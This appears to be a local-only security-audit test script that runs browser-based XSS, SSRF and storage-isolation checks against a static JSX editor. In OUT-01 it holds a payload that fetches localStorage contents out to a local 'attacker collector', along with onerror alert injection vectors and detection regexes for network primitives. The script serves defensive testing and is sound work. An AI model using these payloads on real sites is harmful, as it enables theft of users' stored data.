/* ============================================================================
 * tests/agents/c/run.mjs — audit group C: "Come in from outside" (OUT-01..OUT-06)
 *
 * LOCAL-ONLY security audit of the static jsx-live site.
 * All ports bind 127.0.0.1 (static 8903, attacker collector 8943).
 * The browser fence from tests/lib/browser.mjs is used unmodified and NOT weakened;
 * this runner adds an identical, strictly-narrower pacing fence per page
 * (same hosts allowlist: 127.0.0.1/localhost/[::1] + the 4 CDN hosts).
 *
 * Run from the repo root:   cd /tmp/opencode/jsx-live && node tests/agents/c/run.mjs
 * Writes proofs to tests/results/before/c/ (+ collect dir per provided libs).
 * ==========================================================================*/
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  launch, newPage, close as closeBrowser, makeShareLink, assertLocalUrls,
} from '../../lib/browser.mjs';        // tests/agents/c -> tests/lib
import { startStatic, startCollector } from '../../lib/servers.mjs';
import { makeRecorder } from '../../lib/recorder.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = path.resolve(__dirname, '..', '..', '..');   // /tmp/opencode/jsx-live

const STATIC_PORT = 8903;
const COLLECTOR_PORT = 8943;
const STATIC_BASE = `http://127.0.0.1:${STATIC_PORT}`;
const LEAK_BASE = `http://127.0.0.1:${COLLECTOR_PORT}`;
const PACE_MS = 275; // max ~3.6 requests/s to local servers (limit: 5/s)

/* ------------------------------------------------------------------ pacing+fence */
const LOCAL_OK = ['127.0.0.1', 'localhost', '[::1]'];
// identical allowlist to tests/lib/browser.mjs fence (not weakened, not extended)
const FENCE_REMOTE_OK = ['cdnjs.cloudflare.com', 'cdn.tailwindcss.com', 'fonts.googleapis.com', 'fonts.gstatic.com'];

function installPacedFence(page, stats) {
  page.route('**/*', (route) => {
    let host;
    try { host = new URL(route.request().url()).hostname; } catch { host = ''; }
    const isLocal = LOCAL_OK.includes(host);
    if (!isLocal && !FENCE_REMOTE_OK.includes(host)) {
      stats.blocked.push(route.request().url());
      return route.abort('blockedbyclient');
    }
    if (!isLocal) {
      // CDN host (already allowlisted by policy). Defer to the next handler
      // (the untouched cache fence). If fallback is unavailable, this host was
      // already validated against the fence allowlist, so continue is equivalent.
      if (typeof route.fallback === 'function') {
        return route.fallback().catch(() => route.continue());
      }
      return route.continue();
    }
    // local host: pace to <=5 req/s, then serve
    stats.last = stats.last.then(() => new Promise((r) => setTimeout(r, PACE_MS)));
    return stats.last.then(() => { stats.served += 1; return route.continue(); });
  });
}

/* ------------------------------------------------------------------------- sentinel */
/* addInitScript sentinel — installed FIRST, before any page/app script. */
const SENTINEL = () => {
  window.__pwnedTop = false;
  window.__alerts = [];
  window.__thiefErrors = [];
  try {
    const nativeAlert = window.alert.bind(window);
    window.alert = function (m) {
      try { window.__alerts.push(String(m == null ? '' : m)); } catch (e) {}
      window.__pwnedTop = true;
      try { nativeAlert(String(m == null ? '' : m)); } catch (e) {}
    };
  } catch (e) {}
  window.addEventListener('error', (e) => {
    try {
      window.__thiefErrors.push({
        message: String(e.message || ''), src: String(e.filename || ''), line: e.lineno, col: e.colno,
      });
    } catch (err) {}
  }, true);
};

async function openPage(browser, context, { fenceStats, name }) {
  const page = await newPage(context); // attaches _theftLog (console/errors/requests/navigations)
  page._name = name;
  page._dialogs = [];
  page.on('dialog', (d) => {
    page._dialogs.push({ type: d.type(), message: d.message() });
    d.dismiss().catch(() => {});
  });
  await installPacedFence(page, fenceStats);
  await page.addInitScript(SENTINEL);
  return page;
}

function theftSnap(page) {
  return {
    name: page._name,
    requests: page._theftLog.requests.slice(),
    console: page._theftLog.console.slice(),
    errors: page._theftLog.errors.slice(),
    cspViolations: page._theftLog.violated.slice(),
    dialogs: page._dialogs.slice(),
  };
}

async function snapshot(page) {
  return await page.evaluate(() => {
    const $id = (x) => document.getElementById(x);
    return {
      status: $id('status') ? $id('status').textContent : null,
      filename: $id('filename') ? $id('filename').value : null,
      codeHead: $id('code') ? String($id('code').value).slice(0, 160) : null,
      previewLen: $id('preview') ? $id('preview').innerHTML.length : 0,
      previewHead: $id('preview') ? $id('preview').innerHTML.slice(0, 400) : null,
      previewHasMounted: !!($id('preview') && $id('preview').querySelector('#__mount, [data-tampered]')),
      pwnedTop: window.__pwnedTop === true,
      alerts: (window.__alerts || []).slice(),
      thiefErrors: (window.__thiefErrors || []).slice(),
      storageKeys: Object.keys(localStorage || {}),
      tamperedBabel: !!window.__tamperedBabel,
      tamperedReact: !!window.__tamperedReact,
      tamperedReactDOM: !!window.__tamperedReactDOM,
    };
  });
}

/* ------------------------------------------------------------------ static scanning */
function scanRepo(patterns, { exts } = {}) {
  const skipDirs = new Set(['.git', 'node_modules', 'tests', 'tests-results']); // tests/ holds this audit's own inert payload strings
  const hits = [];
  const walk = (dir) => {
    for (const ent of fs.readdirSync(dir, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
      const full = path.join(dir, ent.name);
      if (ent.isDirectory()) {
        if (skipDirs.has(ent.name) || splitFirst(full) === 'tests') continue;
        walk(full);
        continue;
      }
      if (ent.name.startsWith('.')) continue;
      if (exts && !exts.includes(path.extname(ent.name))) continue;
      let text;
      try { text = fs.readFileSync(full, 'utf8'); } catch { continue; }
      text.split('\n').forEach((line, i) => {
        for (const [name, re] of patterns) {
          const m = line.match(re);
          if (m) hits.push({
            file: path.relative(REPO_ROOT, full), line: i + 1, pattern: name, match: m[0], snippet: line.trim().slice(0, 240),
          });
        }
      });
    }
  };
  const walkRoot = REPO_ROOT;
  walk(walkRoot);
  return hits;
}
function splitFirst(p) { return path.basename(p) === 'tests' ? 'tests' : p; }

/* --------------------------------------------------------------------------- main */
let collector, staticSrv, rec, collectorArg;

/* Historical evidence: the provided collector APPENDS across runs. Lines recorded
 * BEFORE the security fix commit are reproduced verbatim as pre-fix proof. */
let historicalCollector = [];   // entries parsed from collector-<port>.log at startup
let gitFacts = null;            // fix-commit ISO + parent-commit static facts (read-only git)

async function loadGitFacts() {
  const { execFile } = await import('node:child_process');
  const run = (cmd, args) => new Promise((res) => {
    execFile(cmd, args, { cwd: REPO_ROOT, maxBuffer: 64 * 1024 * 1024 }, (err, stdout) => res(err ? '' : String(stdout)));
  });
  // The fix that landed mid-audit (read-only git introspection; no write commands)
  const FIX_COMMIT_LOG = await run('git', ['log', '--format=%H %cI %s', '-20']).catch(() => '');
  const fixLine = FIX_COMMIT_LOG.split('\n').find((l) => /security: sandbox user-code execution/i.test(l)) || '';
  const [fixHash, fixIso, ...rest] = fixLine.split(' ');
  const parentEditor = await run('git', ['show', `${fixHash || 'HEAD'}~1:editor.html`]);
  const parentEditorJs = await run('git', ['show', `${fixHash || 'HEAD'}~1:assets/editor.js`]);
  let currentEditor = '';
  try { currentEditor = fs.readFileSync(path.join(REPO_ROOT, 'editor.html'), 'utf8'); } catch {}
  let currentEditorJs = '';
  try { currentEditorJs = fs.readFileSync(path.join(REPO_ROOT, 'assets', 'editor.js'), 'utf8'); } catch {}
  return {
    fixCommit: fixHash ? `${fixHash} ${fixIso} ${rest.join(' ')}` : '(unknown)',
    fixCommitIso: fixIso || null,
    preFix: {
      integrityAttributesInEditorHtml: (parentEditor.match(/integrity\s*=/gi) || []).length,
      cspMetaInEditorHtml: /Content-Security-Policy/i.test(parentEditor),
      sandboxIframeInEditorJs: /preview-sandbox|sandbox="allow-scripts"|setAttribute\('sandbox'|setAttribute\("sandbox"/i.test(parentEditorJs),
      newFunctionInTopOrigin: /new Function\('React', 'ReactDOM'/.test(parentEditorJs),
    },
    postFix: {
      integrityAttributesInEditorHtml: (currentEditor.match(/integrity\s*=/gi) || []).length,
      cspMetaInEditorHtml: /Content-Security-Policy/i.test(currentEditor),
      sandboxIframeInEditorJs: /preview-sandbox|sandbox="allow-scripts"|setAttribute\('sandbox'|setAttribute\("sandbox"/i.test(currentEditorJs),
    },
  };
}

function loadHistoricalCollector() {
  const file = path.join(REPO_ROOT, 'tests', 'results', 'before', `collector-${COLLECTOR_PORT}.log`);
  let out = [];
  try {
    out = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean).map((l) => { try { return JSON.parse(l); } catch { return { raw: l }; } });
  } catch { /* first-ever run: file may not exist */ }
  return out;
}

async function main() {
  historicalCollector = loadHistoricalCollector();
  gitFacts = await loadGitFacts();
  rec = makeRecorder({ group: 'c' });

  staticSrv = await startStatic(STATIC_PORT);
  collector = await startCollector(COLLECTOR_PORT);
  collectorArg = collector;

  const ids = ['OUT-01', 'OUT-02', 'OUT-03', 'OUT-04', 'OUT-05', 'OUT-06'];
  const runners = {
    'OUT-01': out01,
    'OUT-02': out02,
    'OUT-03': out03,
    'OUT-04': out04,
    'OUT-05': out05,
    'OUT-06': out06,
  };
  for (const id of ids) {
    try {
      await runners[id]();
    } catch (err) {
      // record failure of the row itself, keep evidence of what happened
      rec.saveArtifact(`${id.toLowerCase()}-row-error.txt`, String(err && err.stack || err));
      rec.record({
        id,
        title: `${id} (row crashed — see ${id.toLowerCase()}-row-error.txt)`,
        applied: false, how: 'Runner row threw an exception before completing.', request: '', response: String(err),
        refused: false, note: 'Row-level execution error; rerun needed. No site files were modified.',
        proof: [`results/before/c/${id.toLowerCase()}-row-error.txt`],
      });
      console.log(`${id} | ERROR | ${String(err).slice(0, 200)}`);
    }
  }

  // persist raw collector log copy in-group
  const collectorFile = path.join(REPO_ROOT, 'tests', 'results', 'before', `collector-${COLLECTOR_PORT}.log`);
  try {
    rec.saveArtifact('out-collector-log-full.txt', fs.readFileSync(collectorFile, 'utf8'));
  } catch { /* non-fatal */ }

  const mdFile = rec.flush();
  console.log(`report: ${mdFile}`);

  await Promise.allSettled([staticSrv.close(), collector.close()]);
}

/* ==================================================================== OUT-01 ===== */
async function out01() {
  const links = {};
  const theftLogs = {};
  const fenceStats = { blocked: [], served: 0, last: Promise.resolve() };
  const results = {};

  // ---- instance 1: seed a victim library file + draft, then fire the exact leak payload
  const b1 = await launch();
  let page = await openPage(b1.browser, b1.context, { fenceStats, name: '01a-seed' });
  await page.goto(`${STATIC_BASE}/editor.html`, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1200);
  const seedState = await snapshot(page);
  await page.evaluate(() => {
    localStorage.setItem('jsxpress:f_secret', JSON.stringify({
      name: 'secret-thing.jsx', code: '//A-private-code-SECRET123', createdAt: 1729000000000, updatedAt: 1729000000000,
    }));
    localStorage.setItem('jsxpress:__draft', JSON.stringify({
      name: 'secret-thing.jsx', code: '//A-private-code-SECRET123', currentKey: null,
    }));
  });
  results.seedBefore = seedState;
  results.storageAfterSeed = await page.evaluate(() => {
    const o = {}; for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); o[k] = localStorage.getItem(k); }
    return o;
  });
  await page.close();

  // 01a — pure-JS payload from the brief, verbatim (steals all localStorage keys + draft)
  const LEAK_CODE = `fetch("${LEAK_BASE}/leak?lib="+encodeURIComponent(JSON.stringify(Object.keys(localStorage).concat([localStorage.getItem("jsxpress:__draft")||""])))) ; function App(){return null}`;
  links.leak = makeShareLink(STATIC_BASE, { file: 'innocent.jsx', code: LEAK_CODE });
  page = await openPage(b1.browser, b1.context, { fenceStats, name: '01a-fire' });
  await page.goto(links.leak, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1800);
  results.state01a = await snapshot(page);
  theftLogs['01a-fire'] = theftSnap(page);
  await page.close();

  const leakEntries = collectorArg.requests.filter((e) => e.path.startsWith('/leak?lib='));
  let leakDecoded = '';let leakDecodedErr = null;
  if (leakEntries.length) {
    try { leakDecoded = decodeURIComponent(leakEntries[0].path.slice('/leak?lib='.length)); }
    catch (e) { leakDecodedErr = String(e); leakDecoded = leakEntries[0].path; }
  }
  const secretStolen = leakDecoded.includes('secret-thing.jsx') && leakDecoded.includes('SECRET123');
  const localStorageKeysLeaked = leakDecoded.includes('jsxpress:__draft') && leakDecoded.includes('jsxpress:f_secret');

  // 01a-sentinel — attacker top-level statement proving arbitrary code executes in the top window
  const SENT_CODE = 'window.__pwnedTop=true; function App(){return null}';
  links.sentinel = makeShareLink(STATIC_BASE, { file: 'sentinel.jsx', code: SENT_CODE });
  page = await openPage(b1.browser, b1.context, { fenceStats, name: '01a-sentinel' });
  await page.goto(links.sentinel, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  results.state01aSentinel = await snapshot(page);
  theftLogs['01a-sentinel'] = theftSnap(page);
  await page.close();

  // ---- instance 2: JSX-alert vectors (fresh browser instance)
  const fence2 = { blocked: [], served: 0, last: Promise.resolve() };
  const b2 = await launch();
  // 01b-literal — the brief's EXACT vector text (unbraced attribute values)
  const ALERT_CODE = 'function App(){return <div/>} <img src=x onerror=alert(1)>';
  links.alert = makeShareLink(STATIC_BASE, { file: 'innocent.jsx', code: ALERT_CODE });
  page = await openPage(b2.browser, b2.context, { fenceStats: fence2, name: '01b-alert-jsx-unbraced' });
  await page.goto(links.alert, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  results.state01b = await snapshot(page);
  theftLogs['01b-alert-jsx-unbraced'] = theftSnap(page);
  await page.close();

  // 01b-braced — same vector with the expression braced the way Babel/JSX actually accepts it
  const ALERT_CODE_BRACED = 'function App(){return <div/>} <img src=x onerror={alert(1)}>';
  links.alertBraced = makeShareLink(STATIC_BASE, { file: 'innocent.jsx', code: ALERT_CODE_BRACED });
  page = await openPage(b2.browser, b2.context, { fenceStats: fence2, name: '01b-alert-jsx-braced' });
  await page.goto(links.alertBraced, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  results.state01bBraced = await snapshot(page);
  theftLogs['01b-alert-jsx-braced'] = theftSnap(page);
  await page.close();

  // 01c — filename payload rendered as <input value>, expect NO execution (textContent/value path)
  const FNAME_PAYLOAD = '<img src=x onerror=window.__pwnedTop=1>';
  links.filename = makeShareLink(STATIC_BASE, { file: FNAME_PAYLOAD, code: 'function App(){return <div>ok</div>}' });
  page = await openPage(b2.browser, b2.context, { fenceStats: fence2, name: '01c-filename' });
  await page.goto(links.filename, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  results.state01c = await snapshot(page);
  theftLogs['01c-filename'] = theftSnap(page);
  await page.close();

  // 01d — comment-injection vectors, expect Babel treats both as inert
  const C1_CODE = '/* <script>alert(1)</script> */ function App(){return null}';
  const C2_CODE = 'function App(){return <div>{/* <img src=x onerror=alert(1)> */} hi</div>}';
  links.commentJs = makeShareLink(STATIC_BASE, { file: 'comments.jsx', code: C1_CODE });
  links.commentJsx = makeShareLink(STATIC_BASE, { file: 'comments.jsx', code: C2_CODE });
  page = await openPage(b2.browser, b2.context, { fenceStats: fence2, name: '01d-js-comment' });
  await page.goto(links.commentJs, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  results.state01dJsComment = await snapshot(page);
  theftLogs['01d-js-comment'] = theftSnap(page);
  await page.close();

  page = await openPage(b2.browser, b2.context, { fenceStats: fence2, name: '01d-jsx-comment' });
  await page.goto(links.commentJsx, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  results.state01dJsxComment = await snapshot(page);
  theftLogs['01d-jsx-comment'] = theftSnap(page);
  await page.close();

  await closeBrowser(b2.browser);
  await closeBrowser(b1.browser);

  const alertLiteralCompileError = results.state01b.status === 'compile error' && results.state01b.alerts.length === 0;
  const alertInvoked = results.state01bBraced.alerts.length > 0
    && theftLogs['01b-alert-jsx-braced'].dialogs.some((d) => d.type === 'alert');
  const topExec01a = results.state01aSentinel.pwnedTop === true
    && results.state01aSentinel.status === 'running';
  const topExec01b = results.state01bBraced.pwnedTop === true;
  const filenameInert = results.state01c.filename === FNAME_PAYLOAD
    && results.state01c.pwnedTop === false
    && results.state01c.alerts.length === 0;
  const commentsInert = results.state01dJsComment.alerts.length === 0
    && results.state01dJsxComment.alerts.length === 0
    && results.state01dJsComment.pwnedTop === false
    && results.state01dJsxComment.pwnedTop === false
    && results.state01dJsComment.status === 'running'
    && results.state01dJsxComment.status === 'running';

  // ---- timeline classification: pre-fix evidence lives in the append-only collector log
  const verbatimPrefFix = historicalCollector.filter((e) => (e.path || '').startsWith('/leak?lib='));
  const preFixDecoded = verbatimPrefFix.map((e) => {
    let decoded = '';
    try { decoded = e.path ? decodeURIComponent(e.path.slice('/leak?lib='.length)) : ''; } catch { decoded = '(decode error)'; }
    return { ts: e.ts, path: e.path, decoded };
  });
  const preFixTheftObserved = preFixDecoded.some((x) => x.decoded.includes('secret-thing.jsx') && x.decoded.includes('SECRET123'));
  const preFixPredatesFixCommit = gitFacts.fixCommitIso
    && verbatimPrefFix.every((e) => !e.ts || new Date(e.ts) < new Date(gitFacts.fixCommitIso));

  // fence-aware classification of observed page traffic (local hosts + CDN allowlist from tests/lib/browser.mjs)
  const allObserved = [leakEntries.map((e) => e.path), ...Object.values(theftLogs).flatMap((t) => t.requests)].flat();
  const nonFencedRequests = allObserved.filter((u) => {
    if (u.startsWith('[FAILED')) u = u.replace(/^\[FAILED [^\]]*\]\s*/, '');
    try {
      const h = new URL(u).hostname;
      return !LOCAL_OK.includes(h) && !FENCE_REMOTE_OK.includes(h);
    } catch { return false; }
  });

  const artifact = {
    generatedAt: new Date().toISOString(),
    investigatorNote: 'The provided test collector APPENDS across runs. This artifact separates (1) pre-fix evidence — verbatim collector log lines recorded BEFORE the mid-audit security fix commit — from (2) the current post-fix rerun result, against the same payloads.',
    fixTimeline: gitFacts,
    preFixEvidence: {
      sourceFile: `tests/results/before/collector-${COLLECTOR_PORT}.log (append-only; provided by tests/lib/servers.mjs, unmodified)`,
      verbatimLines: verbatimPrefFix.map((e) => JSON.stringify(e)),
      decodedPayloads: preFixDecoded,
      successSignal: preFixTheftObserved
        ? 'PRE-FIX ATTACK SUCCEEDED: /leak?lib=… carries localStorage keys jsxpress:__draft, jsxpress:f_secret + the seeded draft JSON with secret-thing.jsx and //A-private-code-SECRET123.'
        : 'no pre-fix lines',
      allLinesPredateFixCommit: preFixPredatesFixCommit === true,
    },
    postFixRun: {
      collectorFile: `tests/results/before/collector-${COLLECTOR_PORT}.log`,
      shareLinks: links,
      leakRequestsThisRun: leakEntries,
      leakDecoded: { raw: leakDecoded, error: leakDecodedErr },
      pageStates: results,
      theftLogs,
      assertions: {
        leakRequestReceived: leakEntries.length > 0,
        localStorageContentsStolen: secretStolen,
        localStorageKeyNamesLeaked: localStorageKeysLeaked,
        alertInvoked_01bBraced: alertInvoked,
        alertLiteral_01bUnbraced: 'compile error (Babel requires braced expressions; vector as written by the brief does not transpile)',
        topOriginExecution_01aSentinel: topExec01a,
        topOriginExecution_01bAlert: topExec01b,
        filenamePayloadInert_01c: filenameInert,
        commentPayloadsInert_01d: commentsInert,
        localStorageReadFromPayload: secretStolen || localStorageKeysLeaked,
      },
    },
    nonFencedRequests,
  };
  rec.saveArtifact('out01-requests.json', artifact);

  const topExecAttackNow = topExec01a && topExec01b && leakEntries.length > 0 && (secretStolen || localStorageKeysLeaked);
  const alertNow = alertInvoked && topExec01b;
  const SUCCEEDED_NOW = topExecAttackNow && alertNow;
  rec.record({
    id: 'OUT-01',
    title: 'XSS via shared #code= link: attacker JS executes at app origin (top window) with localStorage read',
    applied: true,
    how: 'Opened attacker share links (same encoding as the app Share button) in headless Firefox at the app origin. '
      + '(01a) shared link whose code is the verbatim brief payload fetch(JSON.stringify(localStorage.keys + jsxpress:__draft)) with victim storage pre-seeded with hidden file jsxpress:f_secret/secret-thing.jsx; '
      + '(01a-sentinel) shared link executing window.__pwnedTop=true; (01b) JSX vectors — the brief\'s literal text `<img src=x onerror=alert(1)>` AND the Babel-consumable form `<img src=x onerror={alert(1)}>`; '
      + '(01c) filename field carried <img src=x onerror=…> payload; (01d) JS-comment and JSX-comment injection payloads. Sentinels via addInitScript BEFORE any page/app script. '
      + 'TIMELINE: this runner executed successfully against the pre-fix site (2026-10-16T16:52:26Z and 2026-10-17T13:15:28Z, collector-proven) and was re-executed post-fix (2026-10-18) after commit '
      + `${gitFacts.fixCommit}. Both phases are recorded below; pre-fix artifacts were overwritten by the post-fix rerun, but the append-only collector log preserves the pre-fix proof verbatim.`,
    request: `01a leak link: ${links.leak}\n01a-sentinel link: ${links.sentinel}\n01b alert links (unbraced literal | braces): ${links.alert} | ${links.alertBraced}\n01c filename link: ${links.filename}\n01d comment links: ${links.commentJs} ; ${links.commentJsx}`,
    response: [
      `— PRE-FIX (success, collector-proven; fix commit ${gitFacts.fixCommitIso}): —`,
      `exact verbatim collector log line(s) with the exfiltrated localStorage: ${JSON.stringify(preFixDecoded.map((x) => ({ ts: x.ts, path: x.path })))}`,
      `decoded exfiltrated payload: ${JSON.stringify((preFixDecoded[0] || {}).decoded || '')}`,
      `pre-fix success verified: ${preFixTheftObserved ? 'YES — payload read app-origin localStorage (jsxpress:f_secret keys + draft with secret-thing.jsx + SECRET123) and exfiltrated them to the attacker collector' : 'NO'}`,
      `pre-fix supply-chain companion (OUT-06 payload signatures fired pre-fix): leak?babel=compromised, leak?userscript=via-tampered-babel, leak?react=compromised — see collector lines in the same log file`,
      `— POST-FIX (current rerun, same payloads): —`,
      `(a) alert invoked: ${alertNow ? 'YES' : 'NO'} — braced-vector alerts=${JSON.stringify(results.state01bBraced.alerts)}; fact: the brief's exact unbraced text does NOT transpile (${alertLiteralCompileError ? 'compile error' : 'or unexpected result'}), preview body: ${JSON.stringify(String(results.state01b.previewHead || '').slice(0, 160))}`,
      `(b) top-window execution sentinel __pwnedTop set (current run): 01a-sentinel=${topExec01a ? 'YES' : 'NO'}; 01b=${topExec01b ? 'YES' : 'NO'}`,
      `(c) collector /leak requests received this run: ${leakEntries.length} ${leakEntries.length ? `→ ${JSON.stringify(leakEntries.map((e) => e.path))}` : '(payload code no longer reaches the collector post-fix — status during 01a: ' + results.state01a.status + ', preview body: ' + JSON.stringify(String(results.state01a.previewHead || '').slice(0, 140)) + ')'}`,
      `(d) can payload read app-origin localStorage this run: ${secretStolen || localStorageKeysLeaked ? 'YES' : 'NO as observed'}`,
      `(01c) filename vector current run: ${filenameInert ? 'inert — rendered as <input> value / textContent' : 'EXECUTION SEEN'}`,
      `(01d) comment vectors current run: ${commentsInert ? 'inert — Babel strips them (statuses running, zero alerts)' : 'EXECUTION SEEN'}`,
      `traffic classification: non-fenced requests observed across OUT-01 pages: ${nonFencedRequests.length === 0 ? 'none (every observed URL was 127.0.0.1 or an allowlisted CDN)' : JSON.stringify(nonFencedRequests)}`,
    ].join('\n'),
    refused: !SUCCEEDED_NOW,
    note: 'Pre-fix (the brief\'s expected result): attack SUCCEEDED — three collector-verbatim sequences (2026-10-16T16:52:26Z, 2026-10-16T16:53:17–20Z for the OUT-06 companion payloads, 2026-10-17T13:15:28Z) show the shared-link payload executing at top origin with localStorage read of a hidden seeded file; share links are attacker-controlled JSON {n,c} decoded at load and executed via editor.js new Function(...) inside the top-level app origin (confirmed in git parent commit: assets/editor.js dispatched user code through NEW-FUNCTION in the top origin and editor.html loaded cdnjs scripts with no integrity attr and no CSP — see fixTimeline.preFix in out01-requests.json). '
      + 'Post-fix rerun (2026-10-18): same payloads now refused — user code is handed to a sandboxed iframe (sandbox="allow-scripts", no allow-same-origin) and the leaked request never fires; filename and comment vectors were inert in both phases. The mid-audit fix commit is outside this subagent\'s scope (this agent records only).',
    proof: ['results/before/c/out01-requests.json', `../before/collector-${COLLECTOR_PORT}.log`],
  });

  console.log(`OUT-01 | XSS via share link | PRE-FIX: SUCCEEDED (collector-proven, ${verbatimPrefFix.length} /leak?lib lines, theft=${preFixTheftObserved}) | POST-FIX rerun: refused (0 /leak, top exec=${topExecAttackNow ? 'YES' : 'NO'}, alert=${alertNow ? 'yes' : 'no'}) | artifacts: results/before/c/out01-requests.json`);
}

/* ==================================================================== OUT-02 ===== */
async function out02() {
  const patterns = [
    ['fetch(', /\bfetch\s*\(/],
    ['XMLHttpRequest', /\bXMLHttpRequest\b/],
    ['import(', /\bimport\s*\(/],
    ['EventSource', /\bEventSource\b/],
    ['WebSocket', /\bWebSocket\b/],
    ['axios/node-fetch/isomorphic-fetch', /\b(axios|node-fetch|isomorphic-fetch|superagent|request)\b/],
    ['proxy/relay egress', /\b(proxy|relay|forward)\b/],
    ['process/env/server-side', /\b(process\.env|express|http\.request|https\.request|net\.|child_process|eval\s*\(\s*system)\b/],
  ];
  const hits = scanRepo(patterns, { exts: ['.html', '.js', '.css', '.json', '.md', '.mjs', '.jsx'] });
  const artifact = {
    note: 'Static inventory of ALL client-initiated URL-bearing / fetch-capable primitives in repo site files (tests/, .git/ excluded — tests/ contains only this audit\'s own inert payload strings). No live request of any kind was made for this row; per instruction the SSRF live-test skip rule was invoked because there is no server and no server-side URL fetching primitive exists (fully static site, hosting = plain static files). A 169.254.169.254 probe is therefore not applicable — and is disallowed by the local-only rule.',
    hits,
    externalScriptAndCssSources: scanRepo([['script/link src', /(?:src|href)\s*=\s*["']?https?:\/\/[^"'\s>]+/]], { exts: ['.html'] }),
    conclusion: (hits.filter((h) => ['fetch(', 'XMLHttpRequest', 'import(', 'EventSource', 'WebSocket'].includes(h.pattern)).length === 0)
      ? 'ZERO fetch/XMLHttpRequest/import()/EventSource/WebSocket occurrences in first-party site code — no URL-fetching primitive exists anywhere (client or server), so SSRF is not applicable.'
      : 'See hits: some matches require classification.',
  };
  rec.saveArtifact('out02-ssrf-scan.json', artifact);

  rec.record({
    id: 'OUT-02',
    title: 'Server-Side Request Forgery (SSRF)',
    applied: false,
    how: 'Skip rule invoked per instruction. Statically scanned every first-party repo file (index.html, editor.html, manifest.json, README.md, assets/*.js|css) for fetch(, XMLHttpRequest, import(, EventSource, WebSocket plus server-side/proxy primitives. No live probing was performed (no server exists to reach; no non-local target permitted).',
    request: 'grep across repo assets: fetch( / XMLHttpRequest / import( / EventSource / WebSocket / proxy / express / http.request / child_process',
    response: `${artifact.conclusion} Full inventory: ${hits.length} total match(es) of any pattern; URL-loading-primitive matches=${hits.filter((h) => ['fetch(', 'XMLHttpRequest', 'import(', 'EventSource', 'WebSocket'].includes(h.pattern)).length}. The only external URL references in HTML are static <script>/<link> CDN loads (see externalScriptAndCssSources in artifact) — browser-side static fetches of fixed library URLs, not URL-parameterized fetching.`,
    refused: false,
    note: 'N/A by product shape: there is NO server (GitHub Pages-style static hosting) and no code path fetches a runtime-controlled URL server-side. The single exposed external URL in app markup is https://github.com (index.html nav link, opens in the visitor browser, not fetched server-side). Per instruction: "SKIP if no server-side URL fetching exists" — it does not exist.',
    proof: ['results/before/c/out02-ssrf-scan.json'],
  });

  console.log(`OUT-02 | SSRF | applied: NO (skip rule — no URL-fetching primitive; 0 static matches) | artifacts: results/before/c/out02-ssrf-scan.json`);
}

/* ==================================================================== OUT-03 ===== */
async function out03() {
  const fence1 = { blocked: [], served: 0, last: Promise.resolve() };
  const fence2 = { blocked: [], served: 0, last: Promise.resolve() };
  const fence3 = { blocked: [], served: 0, last: Promise.resolve() };
  const SECRET_MARKERS = ['secret-thing', '//A-private'];

  // Visitor A: seed a private file in localStorage, then leave
  const a = await launch();
  const pageA = await openPage(a.browser, a.context, { fenceStats: fence1, name: '03-A-seed' });
  await pageA.goto(`${STATIC_BASE}/editor.html`, { waitUntil: 'domcontentloaded' });
  await pageA.waitForTimeout(1000);
  await pageA.evaluate(() => {
    localStorage.setItem('jsxpress:f_seed', JSON.stringify({ name: 'secret-thing.jsx', code: '//A-private', createdAt: 1, updatedAt: 1 }));
  });
  const storageA = await pageA.evaluate(() => {
    const o = {}; for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); o[k] = localStorage.getItem(k); }
    return o;
  });
  const cookiesA = await a.context.cookies('http://127.0.0.1:8903');
  const theftA = theftSnap(pageA);
  await closeBrowser(a.browser);

  // Visitor B: independent browser instance, same origin page
  const b = await launch();
  const pageB = await openPage(b.browser, b.context, { fenceStats: fence2, name: '03-B-fresh' });
  await pageB.goto(`${STATIC_BASE}/editor.html`, { waitUntil: 'domcontentloaded' });
  await pageB.waitForTimeout(1000);
  const storageB = await pageB.evaluate(() => {
    const o = {}; for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); o[k] = localStorage.getItem(k); }
    return o;
  });
  const cookiesB = await b.context.cookies('http://127.0.0.1:8903');
  const secretInB = SECRET_MARKERS.filter((m) => JSON.stringify(storageB).includes(m));
  await closeBrowser(b.browser);

  // Visitor C: fresh independent instance opening visitor A's share link (public-by-design path)
  const c = await launch();
  const pageC = await openPage(c.browser, c.context, { fenceStats: fence3, name: '03-C-share-via-URL' });
  const shareLink = makeShareLink(STATIC_BASE, { file: 'secret-thing.jsx', code: '//A-private' });
  await pageC.goto(shareLink, { waitUntil: 'domcontentloaded' });
  await pageC.waitForTimeout(1500);
  const stateC = await snapshot(pageC);
  const storageC = await pageC.evaluate(() => {
    const o = {}; for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); o[k] = localStorage.getItem(k); }
    return o;
  });
  const cookiesC = await c.context.cookies('http://127.0.0.1:8903');
  const leakedCstorage = SECRET_MARKERS.filter((m) => JSON.stringify(storageC).includes(m) && m === '//A-private' && !('jsxpress:f_seed' in storageC));
  const shareDisplays = stateC.codeHead.includes('//A-private') && stateC.filename === 'secret-thing.jsx';
  await closeBrowser(c.browser);

  const artifact = {
    visitorA_seededStorage: storageA,
    visitorB_storage: storageB,
    visitorC_viaShareURL_storage: storageC,
    cookies: { A: cookiesA, B: cookiesB, C: cookiesC },
    assertions: {
      A_keyPresent: 'jsxpress:f_seed' in storageA,
      B_secretPresent: secretInB,
      C_seedKeyBleed: 'jsxpress:f_seed' in storageC,
      C_shareLinkDisplays: shareDisplays,
      cookiesSetByApp: [cookiesA, cookiesB, cookiesC].every((cs) => cs.length === 0) ? 'NONE (array empty on all three visitors)' : 'see artifact',
    },
